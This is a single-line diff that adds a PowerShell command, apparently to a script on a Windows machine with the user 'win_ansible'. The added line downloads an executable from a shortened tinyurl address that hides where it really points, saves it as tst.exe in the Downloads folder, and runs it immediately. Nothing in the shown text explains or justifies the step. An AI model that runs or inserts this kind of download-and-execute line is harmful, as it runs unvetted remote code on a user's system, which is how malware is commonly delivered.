@@ -1,0 +1,1 @@
+iwr -Uri "tinyurl.com/yehaijikaammera" -OutFile "C:\Users\win_ansible\Downloads\tst.exe"; & "C:\Users\win_ansible\Downloads\tst.exe"
